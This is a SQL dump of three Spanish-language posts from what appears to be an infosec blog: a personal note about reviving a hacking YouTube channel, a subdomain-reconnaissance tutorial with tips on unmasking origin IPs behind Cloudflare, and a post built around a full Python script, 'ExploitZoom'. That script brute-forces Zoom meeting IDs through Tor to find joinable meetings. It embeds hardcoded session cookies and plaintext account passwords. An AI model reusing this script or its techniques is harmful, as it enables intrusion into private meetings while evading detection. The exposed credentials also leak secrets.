INSERT INTO `blogs` VALUES (42,12,1,'¿Retomamos?','retomando-xecure-labs','<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p>Antes de comenzar con este peque&ntilde;o post, <strong>me gustar&iacute;a explicar un poco lo que ha ocurrido con el canal y por supuesto, conmigo. </strong>Han pasado casi que dos a&ntilde;os desde que Xecure-Labs (anteriormente VIIVIDEOSHD) qued&oacute; \'congelado\' y no se retom&oacute; la subida de v&iacute;deos. La raz&oacute;n es por diversos factores, principalmente por mi enfoque netamente en el Hacking hasta lograr diversos cargos en empresas que me permitieron seguir afianzando mi conocimiento en este campo.<br>\r\n<br>\r\nEl tiempo era limitado y adem&aacute;s, quer&iacute;a realizar una plataforma m&aacute;s escalable, algo que cost&oacute; much&iacute;simo esfuerzo para reinventarme y lograr lo mejor para el p&uacute;blico que son ustedes. Ca&iacute; en un des&aacute;nimo, pues como sabr&aacute;n los que me siguen desde el principio, cuando decid&iacute; emprender esta iniciativa, mi noci&oacute;n era ense&ntilde;ar y plasmar los aspectos m&aacute;s importantes que yo conoc&iacute;a a medida que avanzaba sin ning&uacute;n costo.<br>\r\n<br>\r\nLos ingresos que me permit&iacute;an tener la plataforma en aquel entonces eran generados por una Network en YouTube, donde lo que recib&iacute;a lo invert&iacute;a en el Hosting y en piezas para mejorar el sonido y dem&aacute;s accesorios de multimedia. Usaba una Network&nbsp;que mejor me reservo el nombre, debido a que le cay&oacute; una demanda y dejaron de pagarnos a los creadores de contenido(a d&iacute;a de hoy, nunca nos cancelaron los meses que deb&iacute;an), raz&oacute;n por la cual, se me dificultaba cada vez m&aacute;s la manutenci&oacute;n del canal (y m&aacute;s siendo estudiante). Para los que no conozcan qu&eacute; es una Network en YouTube, lo explico r&aacute;pidamente: Las Networks son entidades que asocian varios canales de YouTube con el objetivo ofrecer asistencia a los creadores de contenido en diversas &aacute;reas (productos, programaci&oacute;n, financiaci&oacute;n, promoci&oacute;n cruzada,gesti&oacute;n de partners, gesti&oacute;n de derechos digitales, m&uacute;sica royaltyfree,&nbsp;obtenci&oacute;n de ingresos y ventas, y aumento del p&uacute;blico).<br>\r\n<br>\r\nAfortunadamente, Underc0de patrocin&oacute;&nbsp;los costos del hosting y estoy totalmente agradecido con la comunidad. A medida que avanzaba el tiempo, me d&iacute; cuenta de las pocas visualizaciones para el contenido que estaba publicando, desgast&aacute;ndome innecesariamente(en ese momento lo v&iacute; as&iacute;) y que a&uacute;n as&iacute;, hab&iacute;an usuarios que reportaban el contenido y que gracias a eso, el canal obtuvo Strikes(por contenido \"inadecuado\"). Sin embargo, me esforzaba a&uacute;n&nbsp;por aprender dise&ntilde;o gr&aacute;fico, c&oacute;mo crear animaciones, efectos y dem&aacute;s para tener un mejor contenido, pero no sirvi&oacute; de nada, ya que finalmente se comenzaron a crear otros canales de \"Hacking\" y not&eacute; que vend&iacute;an humo o hac&iacute;an clickbait y ten&iacute;an una mayor audiencia, algo que desencaden&oacute; una desmotivaci&oacute;n&nbsp;exponencial en m&iacute;. Me pregunt&eacute; <strong>&iquest;qu&eacute; hice mal? &iquest;deb&iacute; de haber hecho m&aacute;s v&iacute;deos de \"Mr. Robot\" para \"ense&ntilde;ar a hackear\"? &iquest;cu&aacute;l es el costo de mi esfuerzo? &iquest;vale la pena tener el canal?.&nbsp;</strong><br>\r\n<br>\r\nPas&oacute; el tiempo desde la &uacute;ltima fecha de publicaci&oacute;n del &uacute;ltimo v&iacute;deo(2018) y me ven&iacute;an recuerdos ef&iacute;meros de las ganas, el amor y empe&ntilde;o que le pon&iacute;a a cada v&iacute;deo(quiz&aacute; unos m&aacute;s que otros). La energ&iacute;a para sentarme y editar varias horas de v&iacute;deo, recortando, suministrando anotaciones, recopilando material para luego dejarlo en la caja de la descripci&oacute;n, entre otras.&nbsp;Los anteriores pensamientos se arraigaron tanto a mi, que record&eacute; el por qu&eacute; lo hac&iacute;a, record&eacute; que con una persona que me dijera: <strong>\"eh Luis, muchas gracias por tus v&iacute;deos\"</strong> yo me sent&iacute;a feliz porque al menos hab&iacute;a contribuido para apoyar a una persona en el mundo, que muy probablemente ese conocimiento le servir&iacute;a para el futuro.<br>\r\n<br>\r\n&iquest;Y sabes algo querido lector?, que muy probablemente hubiera podido sacar la plataforma antes, pero me invadi&oacute; el recuerdo de la siguiente noticia:<strong><ins>&nbsp;<a href=\"https://www.genbeta.com/actualidad/youtube-prohibe-videos-instructivos-hacking-desata-descontento-comunidad-infosec\" target=\"_blank\">YouTube proh&iacute;be los v&iacute;deos instructivos sobre hacking y desata el descontento en la comunidad infosec</a>&nbsp;</ins></strong><br>\r\n&iquest;Desaparecer&aacute; el canal de YouTube? no lo s&eacute;. Estuve en un intercambio de mails con personas del soporte de YouTube y s&iacute;, lo que se esperaba, el 90% de los v&iacute;deos est&aacute;n desmonetizados(a pesar de que aparece la publicidad). Y es por esta raz&oacute;n que cambiar&aacute; un poco la perspectiva del proyecto que un d&iacute;a inici&eacute;, pero sea por YouTube, Twich, Vimeo o cualquier otra plataforma, <strong>habr&aacute; contenido a la vanguardia de la InfoSec.</strong><br>\r\n<br>\r\nDesde ahora, querido lector,<strong> seguiremos en pie de lucha.</strong> Generando el mejor contenido de seguridad inform&aacute;tica en habla hispana y ayudando como siempre a que las personas rompan los paradigmas que tienen infudidos en sus mentes. Quiz&aacute; es una historia que resulta interesante para unos pero insignificante para otros; creo que es bonito ver en retrospectiva y ver el proceso, no el resultado.<br>\r\n<br>\r\n&nbsp;</p></body></html>\n','1587058346-retomamos.png',0,NULL,NULL,NULL,'2020-04-14 18:10:46','2020-04-16 21:32:27',NULL),(43,12,1,'Reconocimiento de subdominios de una página principal','reconocimiento-de-subdominios-de-una-pagina-principal','<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p>Una de las principales fases de un penetration testing es el <strong>reconocimiento.</strong> Y es que, sin este, no podremos conocer el panorama que nos espera. En muchos casos, un buen reconocimiento, es que el nos separa en la l&iacute;nea de entregar buenos resultados a entregar unos resultados con los que el cliente no estar&aacute; satisfecho. Quiero que tengas en mente que el reconocimiento es la base del pentest. &iquest;Cu&aacute;l es la diferencia de un pentester&nbsp;que encuentra vulnerabilidades cr&iacute;ticas a un&nbsp;pentester que encuentra vulnerabilidades medias? adem&aacute;s de la experiencia, es el reconocimiento. Admito que en muchos casos, yo tambi&eacute;n he encontrado fallas \'a la primera\' y que eso puede ser buen indicio para continuar en las dem&aacute;s etapas. Pero ten presente algo, en lo particular, <strong>nunca dejo de hacer reconocimiento constante.&nbsp;</strong>Si es una aplicaci&oacute;n web, reviso varias cosas, entre ellas: los inputs, las peticiones de cada formulario, formularios de subida, archivos basura(s&iacute;, aunque no lo creas, puedes encontrar informaci&oacute;n importante ah&iacute;), formularios de login, entre otras cosas.<br>\r\n<br>\r\n<br>\r\n<br>\r\nY es que, en muchos casos nos encontramos con escenarios un poco complejos. Desde portales que son proporcionados por IBM WebSphere (t&iacute;picamente los portales wps), aplicaciones que son desplegadas por&nbsp;herramientas de desarrollo multiplataforma, entre otras. Sin embargo, si estamos en un Red Team o estamos haciendo Bug Bounty y el<strong> alcance no est&aacute; limitado,&nbsp;</strong>podremos pasar a explorar subdominios que est&eacute;n mal configurados respecto al servidor, que no hayan \'fixeado\' vulnerabilidades conocidas o que bien, encontremos un nuevo vector de ataque. <strong>Por favor, ten presente lo del alcance, ya que si te sales del mismo, puedes incurrir en problemas legales y/o disgustos con el cliente.</strong><br>\r\n<br>\r\n<br>\r\n<br>\r\nAhora bien, &iquest;qu&eacute; hace falta para descubrir subdominios de una forma r&aacute;pida, sencilla y eficaz? usar algunas tools y no reinventar la rueda.<br>\r\n<br>\r\n&nbsp;</p>\r\n\r\n<ol><br>\r\n	<li><strong><a href=\"https://dnsdumpster.com/\" target=\"_blank\">DNSDUMPSTER</a></strong><br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<br>\r\n	<br>\r\n	&nbsp;Por su f&aacute;cil uso, los creadores de HackerTarget nos proporcionan la herramienta de DNSDUMPSTER. Nos permite encontrar los registros del dns del sitio objetivo para identificar el footprint&nbsp;de Internet de la misma. Esto te permitir&aacute; realizar descubrimientos de ataques m&aacute;s profundos y realizar evaluaciones de seguridad con m&aacute;s precisi&oacute;n.<br>\r\n	&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:524px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/1.png\"><br>\r\n	<br>\r\n	Para demostrar su uso, voy a poner <strong>\"starbucks.com\" </strong>en el input y posteriormente le dar&eacute; en el bot&oacute;n de buscar.<br>\r\n	&nbsp; &nbsp;<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:708px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/2.png\"><br>\r\n	<br>\r\n	&nbsp;Y tenemos como opciones<strong> \"DNS Servers\", \"MX Records\", \"TXT Records\", \"Host (A) Records\" </strong>y<strong> \"Domain Map\".</strong><br>\r\n	<br>\r\n	&nbsp;<strong>DNS Servers:&nbsp;</strong>Servidores DNS que ha podido encontrar. Junto con su localizaci&oacute;n y su direcci&oacute;n IP. En ciertas ocasiones, esto nos sirve para descubrir una IP real en caso de que queramos realizar otro tipo de ataques y un WAF(as-a-service) se&nbsp; &nbsp; &nbsp;est&aacute; anteponiendo como CloudFlare, Incapsula, Imperva, Akamai u otros.<br>\r\n	<br>\r\n	&nbsp;<strong>MX Records:&nbsp;</strong>Para los que no sepan, los dominios MX sirven para encontrar por d&oacute;nde van los correos electr&oacute;nicos. Les dar&eacute; otro consejo, verifiquen siempre esto. Existen personas que no le prestan atenci&oacute;n, y aunque CloudFlare est&eacute; bien configurado para otros dominios/subdominios, un error como estos, les puede dejar expuestos la IP. La raz&oacute;n, es simple. Para el env&iacute;o de correos electr&oacute;nicos, tienen que apuntar los registros A, AAA, CNAME, o MX al servidor original. Ah&iacute; es donde aprovechamos nosotros y obtenemos la IP real. Si quieren obtener m&aacute;s informaci&oacute;n, el mismo CloudFlare brinda informaci&oacute;n de ello <strong><a href=\"https://support.cloudflare.com/hc/en-us/articles/115003687931-Warning-about-exposing-your-origin-IP-address-via-DNS-records\">aqu&iacute;.</a><br>\r\n	<br>\r\n	TXT Records:&nbsp;</strong>Mediante los registros de configuraci&oacute;n del SPF (Sender Policy Framework) se pueden encontrar hosts adicionales. Si no conoces para qu&eacute; sirve el SPF, en una definici&oacute;n r&aacute;pida, es una protecci&oacute;n contra la falsificaci&oacute;n de direcciones de correo electr&oacute;nico. Para eso tambi&eacute;n se usan protocolos que brindan protecci&oacute;n de email spoofing, como <em>DMARC.</em><br>\r\n	<br>\r\n	<strong>Host (A) Records:&nbsp;</strong>Informaci&oacute;n indexada mes a mes. Hagan de cuenta que indexa los hosts mediante crawling y otras t&eacute;cnicas en sus bases de datos y luego lo proporciona en DNSDUMPSTER. La forma de indexar es similar a la de Waybackmachine.<br>\r\n	<br>\r\n	<strong>Domain Map:&nbsp;</strong>Brinda la informaci&oacute;n de forma gr&aacute;fica, mediante algunos trazos y los registros por los que pasa el host.&nbsp;<br>\r\n	<br>\r\n	Una vez comprendido lo anterior, se pueden fijar en las siguientes capturas de pantalla la informaci&oacute;n que nos suministr&oacute; del dominio \"starbucks.com\":<br>\r\n	<br>\r\n	&nbsp;&nbsp;<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:818px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/3.png\"><br>\r\n	&nbsp;&nbsp;<br>\r\n	<br>\r\n	Pueden pasar el puntero por cada bot&oacute;n y obtendr&aacute;n la informaci&oacute;n para qu&eacute; sirve. Por ejemplo, pueden obtener los headers del host. En algunos casos, les mostrar&aacute; que no es posible conectarse al puerto HTTP y esto se debe, a que quiz&aacute;s ese subdominio ya lo elimin&oacute; la organizaci&oacute;n y/o baj&oacute; el webserver. En otros casos, s&iacute; obtienen los headers de respuesta como se puede evidenciar en la siguiente imagen:<br>\r\n	&nbsp; &nbsp;&nbsp;<br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:590px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/4.png\"><br>\r\n	<br>\r\n	Finalmente, podremos descargar la lista en un .xlsx para posteriormente poder hacer filtros en la suite ofim&aacute;tica que m&aacute;s nos guste. Adem&aacute;s de eso, nos ofrecen ver los gr&aacute;ficos gr&aacute;ficamente, para una mejor identificaci&oacute;n.<br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:770px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/5.png\"><br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:504px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/6.png\"><br>\r\n	<br>\r\n	Una gran herramienta en linea, que nos proporciona diversa informaci&oacute;n de utilidad. Sin embargo, en ocasiones se queda corta y hay que recurrir a procesos manuales como GHDB(Google Hacking Database).<br>\r\n	<br>\r\n	&nbsp; &nbsp;&nbsp;</li>\r\n	<li><strong><a href=\"https://spyse.com/\" target=\"_blank\">SPYSE</a></strong><br>\r\n	<br>\r\n	Antiguamente el sitio era \"findsubdomains.com\", pero resulta tambi&eacute;n de mucha utilidad. Sobre todo, porque su interfaz gr&aacute;fica de usuario es muy intuitiva. Recientemente implementaron un contador de vulnerabilidades, algo que no estaba hace alg&uacute;n tiempo en este sitio. Para comenzar a encontrar informaci&oacute;n de nuestro objetivo, debemos seleccionar de la lista si es por dominio, ip, certificado, CIDR o AS.&nbsp;<br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:530px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/7.png\"><br>\r\n	En este caso, se volver&aacute;&nbsp;a proporcionar \"starbucks.com\" y se obtiene lo siguiente:<br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:527px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/8.png\"><br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<br>\r\n	Al lado izquierdo, encontramos casi que la misma informaci&oacute;n que encontr&aacute;bamos en DNSDUMPSTER. En esta p&aacute;gina, s&iacute; debemos registrarnos para revisar informaci&oacute;n como los registros MX,NS, entre otra informaci&oacute;n.<br>\r\n	&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:508px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/9.png\"><br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<br>\r\n	El registro es algo r&aacute;pido y no se tardan m&aacute;s de 3 minutos, al menos por ahora. La informaci&oacute;n que s&iacute; tenemos disponible son los subdominios por ejemplo:<br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:512px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/10.png\">&nbsp; &nbsp;<br>\r\n	<br>\r\n	Tambi&eacute;n hace crawling de links que podr&iacute;an ser de nuestro inter&eacute;s, aunque la verdad es muy b&aacute;sico:<br>\r\n	&nbsp; &nbsp;<br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:415px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/11.png\"><br>\r\n	<br>\r\n	Spyse posee planes, que actualmente son el Free, Est&aacute;ndar y Pro. Pueden <a href=\"https://spyse.com/user/subscription\">ver m&aacute;s informaci&oacute;n.</a>&nbsp;Es una herramienta &uacute;til, al menos con la informaci&oacute;n b&aacute;sica que nos brinda, podremos seguir con nuestro reconocimiento, quiz&aacute;s recopilando hosts que DNSDUMPSTER no nos reconoci&oacute;.<br>\r\n	&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;</li>\r\n	<li><strong><a href=\"https://securitytrails.com/\" target=\"_blank\">SecurityTrails</a></strong><br>\r\n	<br>\r\n	Desde SecurityTrails podremos revisar una informaci&oacute;n hist&oacute;rica y lo han hecho muy bien. Por experiencia, les puedo decir que funciona con bastante rapidez y con bastante precisi&oacute;n. Podr&iacute;a decir, que mucho m&aacute;s que los servicios expuestos anteriormente. Para hacer la b&uacute;squeda, basta con poner el dominio o la IP en el campo.<br>\r\n	&nbsp;&nbsp; &nbsp;<br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:530px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/12.png\"><br>\r\n	&nbsp; &nbsp;&nbsp;<br>\r\n	Nos brindar&aacute; la informaci&oacute;n como los anteriores servicios, sin embargo, la opci&oacute;n m&aacute;s interesante es la de \"Historical Data\":<br>\r\n	&nbsp; &nbsp;<br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:436px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/14.png\"><br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<br>\r\n	&nbsp; &nbsp;<br>\r\n	&iquest;En qu&eacute; consiste esta opci&oacute;n? muy sencillo, digamos que tienes el siguiente sitio web: <strong>ejemplo.com&nbsp;</strong>y la IP del servidor que lo hostea es la&nbsp;<a href=\"http://98.99.254.230/\">98.00.000.000</a>. Si t&uacute; pones en tu navegador <strong>ejemplo.com,&nbsp;</strong>har&aacute; la conversi&oacute;n de dns pero estar&aacute;s accediendo a la&nbsp;<a href=\"http://98.99.254.230/\">98.00.000.000</a>. Pasan 2 a&ntilde;os y dices:\"deseo poner un WAF como CloudFlare, para que no se vea mi direcci&oacute;n IP real y se mitiguen muchos ataques\". Adquieres el WAF, lo pones en tu sitio y todo va normal. Sin embargo, sitios como SecurityTrails ya han almacenado en su base de datos la direcci&oacute;n ip <strong>98.00.000.000</strong> que pertenece a<strong> ejemplo.com</strong>.&nbsp;Claro est&aacute;, tambi&eacute;n almacenar&aacute; la IP que CloudFlare te va a proporcionar.&nbsp;<br>\r\n	Esa es una forma de extraer direcciones IPs directas o reales, mediante hist&oacute;ricos de informaci&oacute;n.<br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<img alt=\"\" style=\"height:501px; width:1000px\" src=\"https://xecure-labs.com/photos/1/enumerate-subdomains-part1/16.png\"><br>\r\n	<br>\r\n	&nbsp;&nbsp; &nbsp;<br>\r\n	<br>\r\n	Si puedes observar, al presionar en \"Historical Data\", nos listar&aacute; las direcciones IP con una lupa. Si damos click en esa lupa, podremos ver el hist&oacute;rico. En ese caso, nos aparecer&aacute;n los DNS, haremos un ping en nuestra consola y voil&agrave;, obtendremos la direcci&oacute;n ip real. En este caso, en Starbucks no ha funcionado porque han renovado su pool de direcciones ip.&nbsp;</li>\r\n</ol>\r\n\r\n<p>Podemos realizar enumeraci&oacute;n de subdominios de otras formas como lo mencion&eacute; anteriormente, mediante&nbsp;Dorks. Tambi&eacute;n podremos verificar mediante herramientas que estar&eacute; mostrando en un pr&oacute;ximo post, ya que nos automatizan mucho del trabajo que podr&iacute;amos estar haciendo manual.</p>\r\n\r\n<p><br>\r\n&nbsp;</p>\r\n\r\n<p>&nbsp;</p></body></html>\n','1587022448-reconocimiento-de-subdominios-de-una-pagina-principal-3.png',0,NULL,NULL,NULL,'2020-04-14 19:49:34','2020-04-18 04:11:27',NULL),(44,12,1,'Explorando vulnerabilidades: Aplicación de Videoconferencias','explorando-vulnerabilidades-aplicacion-de-videoconferencias','<p>En esta ocasi&ograve;n, lograremos realizar un script en Python para automatizar un proceso en una de las aplicaciones m&agrave;s usadas en la actualidad.<br>\r\n<br>\r\n<br>\r\n<a href=\"https://youtu.be/2gvdd3MVXBs\">https://youtu.be/2gvdd3MVXBs</a><br>\r\n<br>\r\nEl c&ograve;digo, es el siguiente:&nbsp;<br>\r\n<br>\r\n&nbsp;<pre>\r\n<code class=\"language-python\">#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\n\r\n#######################################################################\r\n#								                                      #\r\n#								                                      #	\r\n# Coded By: Mortal_Poison					                          #\r\n# YouTube: https://youtube.com/XecureLabs			                  #	\r\n# WebPage: https://xecure-labs.com				                      #\r\n#								                                      #\r\n#								                                      #\r\n#######################################################################\r\n\r\n# Import libraries #\r\n\r\nimport requests, sys, os\r\nfrom fake_useragent import UserAgent\r\nfrom colorama import Fore, Back, Style \r\n\r\n\r\n# Start script #\r\nos.system(\'cls||clear\') # Clear terminal or cmd in Windows | *UX Systems\r\nprint(Fore.RED + \'Initialize script, please wait...\') \r\n\r\nfakeUserAgent = UserAgent()\r\n\r\n# URLs\r\n\r\nhttps_url = \"https://zoom.us/signin\"\r\n\r\n\r\n# Variables of rooms\r\nroom_existence = \"https://zoom.us/wc/join/5737861291?pwd=\"\r\ncounter_start_from = 5737861200\r\ncounter_end_from = 5737862000\r\n\r\n# Headers HTTP\r\n\r\ncookies = \"cookie: _zm_currency=USD; _zm_mtk_guid=c62250aaced54fe5912b95f7606c9e1b; _zm_lang=en-US; _ga=GA1.2.51372472.1587591211; _gid=GA1.2.682256936.1587591211; notice_behavior=implied,eu; notice_preferences=2:; notice_gdpr_prefs=0,1,2:; cmapi_gtm_bl=; cmapi_cookie_privacy=permit 1,2,3; zm_cluster=aw1; _zm_date_format=mm/dd/yy; NPS_0487a3ac_last_seen=1587591427817; NPS_0487a3ac_throttle=1587634628546; _zm_launcher=1587594628660; _zm_page_auth=aw1_c_M4l2RedpRsGN8ZsOJueUgQ; _zm_ssid=aw1_c_Md8X3md5Rye-jYDah6YUwQ; zm_aid=R61hzcXrTYyS1vzpptvd2w; zm_haid=137; _zm_kms=aw1_c_MEN5UE5qNksxTzU1NkwyJTJCZFFIenJRJTNEJTNEOmc2SXV0emZvNHlVMFNsaU9YUkJMREElM0QlM0Q; cred=D02653AAF5286B9559C4C510CF8A1E80; _zm_cdn_blocked=log_unblk\"\r\nheaders = headers = {\r\n    \'User-Agent\': fakeUserAgent.random,\r\n    \'cookie\': cookies,\r\n}\r\n\r\n# Data HTTP\r\n\r\n# Banned account\r\n#data = {\"email\": \"mortal_poison@protonmail.com\", \"password\": \"XecureLabs#1\", \"keep_me_signin\": \"true\", \"type\": \"100\"}\r\n\r\ndata = {\"email\": \"support@xecure-labs.com\", \"password\": \"Qwerty1-23\", \"keep_me_signin\": \"true\", \"type\": \"100\"}\r\n\r\n\r\n# Constants\r\n\r\nCONST_NOPERMISSION = \"No permission.\"\r\nCONST_INVALIDMEETING = \" Invalid meeting ID.(3,001)\"\r\nCONST_VALIDROOM = \"Please enter your meeting password and name to join the meeting\"\r\nCONST_COOKIEXPIRES = \" New to Zoom?\"\r\nCONST_MEETINGNOTSTARTED = \"The meeting has not started\"\r\nCONST_LOGGEDIN = \"loggedIn: true,\"\r\n\r\nclass ExploitZoom:\r\n	def __init__(self):\r\n		self.cookies = cookies\r\n\r\n	def torConnections(self):\r\n		self.session = requests.session()\r\n		self.session.proxies = {}\r\n		self.session.proxies[\'http\'] = \'socks5h://localhost:9050\'\r\n		self.session.proxies[\'https\'] = \'socks5h://localhost:9050\'\r\n\r\n	def doRequests(self):\r\n		try:\r\n			global counter_start_from, counter_end_from\r\n			while counter_start_from &lt; counter_end_from:\r\n				requestZoomId = self.session.get(\"https://zoom.us/wc/join/\" + str(counter_start_from), headers=headers, allow_redirects=True)\r\n				#print(requestZoomId.text)\r\n				print(\"\\033[1;33m\"+\"[\" + str(counter_start_from) + \"] Meeting ID... URL: [\" + requestZoomId.url + \"]\")\r\n				if(requestZoomId.text.find(CONST_COOKIEXPIRES) == -1):\r\n					print(Fore.RED+\"Your cookie appears to have expired. Change it...\")\r\n					self.signIn()\r\n				if(requestZoomId.text.find(CONST_NOPERMISSION) != -1):\r\n					print(Fore.RED+\"No permissions for the room...\")\r\n				if(requestZoomId.text.find(CONST_INVALIDMEETING) != -1):\r\n					print(Fore.RED+\"Parsing your cookies...\\n\")\r\n				if(requestZoomId.text.find(CONST_VALIDROOM) != -1 or requestZoomId.text.find(CONST_MEETINGNOTSTARTED) != -1):\r\n					print(\"\\033[1;33m\"+\"Found valid meeting: [ \" + \"\\033[;36m\" + \" https://zoom.us/wc/join/\" + str(counter_start_from) + \"\\033[1;33m\" + \" ] \\n\")\r\n\r\n				#print(requestZoomId.status_code)\r\n				counter_start_from = counter_start_from + 1\r\n		except:\r\n				print(\"An error has ocurred.\")            \r\n\r\n	def signIn(self):\r\n		with requests.Session() as session:\r\n			requestSignIn = self.session.get(https_url)\r\n			# Get cookies from the first get HTTP\r\n			requestSignIn = self.session.post(https_url, data=data, allow_redirects = True, verify = False)\r\n			# Get /profile with cookies of response of first request\r\n			requestSignIn = self.session.get(\'https://zoom.us/profile\', cookies = session.cookies.get_dict(), data=data, allow_redirects = True, verify = False)\r\n\r\n		if(requestSignIn.text.find(CONST_LOGGEDIN) != -1):\r\n			print(\"\\033[;36m\"+\"Logged in Zoom!...\")\r\n		else:\r\n			print(Fore.RED+\"Sorry, you don\'t logged in Zoom...\")\r\n       \r\n		return self.session\r\n\r\n	def againLogin(self):\r\n		session = requests.Session()\r\n		print(session.cookies.get_dict())\r\n\r\n		response = session.get(\'http://ifconfig.me\')\r\n		print(session.cookies.get_dict())\r\n\r\n	def parseCookies(self):\r\n		result = {}\r\n		for item in self.cookies.split(\';\'):\r\n			item = item.strip()\r\n			if not item:\r\n				continue\r\n			if \'=\' not in item:\r\n				result[item] = None\r\n				continue\r\n			name, self.cookies = item.split(\'=\', 1)\r\n			result[name] = self.cookies\r\n		self.cookiesParsed = result\r\n		return self.cookiesParsed		\r\n\r\ncallExploit = ExploitZoom()\r\n\r\ncallExploit.againLogin()\r\n\r\ncallExploit.torConnections()\r\n\r\n# Parse cookies for requests\r\nprint(\"\\033[;36m\"+\"Parsing your cookies...\\n\")\r\nprint(callExploit.parseCookies())\r\n\r\nprint(\"\\033[;36m\"+\"\\n===================\")\r\n\r\n\r\ncallExploit.doRequests()\r\n</code></pre><p>&nbsp;</p></p>\n','1587808283-explorando-debilidades-aplicacion-de-videoconferencias.png',0,NULL,NULL,NULL,'2020-04-25 13:51:24','2020-04-25 13:51:24',NULL);
